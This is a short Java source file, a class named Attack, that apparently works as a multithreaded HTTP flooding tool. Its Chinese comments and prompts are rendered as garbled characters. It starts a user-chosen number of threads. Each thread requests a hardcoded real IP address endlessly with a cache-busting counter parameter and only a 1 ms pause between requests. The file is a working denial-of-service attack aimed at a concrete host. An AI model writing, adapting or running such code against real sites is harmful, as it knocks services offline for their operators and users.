package org.http;

import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Scanner;

/**
 * ���̹߳�����վ����
 * @author Administrator
 *
 */
public class Attack implements Runnable {
	private static String strUrl = null;
	private static long numL = 0;
	private static Scanner scanner = new Scanner(System.in);
	public void run() {
		HttpURLConnection connection = null;
		InputStream urlStream = null;
		URL url = null;
		while (true) {
			try {
				url = new java.net.URL(strUrl + numL);//�õ�URL
				connection = (java.net.HttpURLConnection)url.openConnection();
				connection.connect();
				urlStream = connection.getInputStream(); 
				if (urlStream != null) {
					++numL;
					urlStream.close();
					System.out.println("������" + numL + "��");
				}
				Thread.sleep(1);
			} catch (InterruptedException e) {
				e.getMessage();
				try{
					Thread.sleep(1);
				} catch(InterruptedException ie){
					ie.printStackTrace();
				}
			} catch (MalformedURLException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	public static void main(String[] args) throws MalformedURLException{
		int threadNum;
		System.out.println("");
		do {
			System.out.println("������Ҫ���ɵ��߳���:");
			threadNum = scanner.nextInt();
			System.out.println("������Ҫ��������ַ:");
			//String str = scanner.next();
			String str = "http://120.55.51.73/static/main/index.html";
			if (!str.startsWith("http")) {
				strUrl = "http://" + str;
				System.out.println(strUrl);
			} else {
				strUrl = str;
			}
			if (str.indexOf("?") >=0 ) {
				strUrl = strUrl + "&num=";
			} else {
				strUrl = strUrl + "?num=";
			}
			System.out.println("--------------------------------------");
			System.out.println("�߳���:" + threadNum);
			System.out.println("������ַ" + strUrl);
			System.out.println("���ٴ�ȷ��(Y/N):");
			String tmp = scanner.next();
			if ("Y".equalsIgnoreCase(tmp)) {
				break;
			} else if("N".equalsIgnoreCase(tmp)) {
				
			} else {
				System.out.println("�������,����������(Y/N):");
			}
		} while(true);
		for (int i=0; i<threadNum; i++) {
			Attack at = new Attack(); 
			Thread t = new Thread(at);
			t.start();
		}
	}
}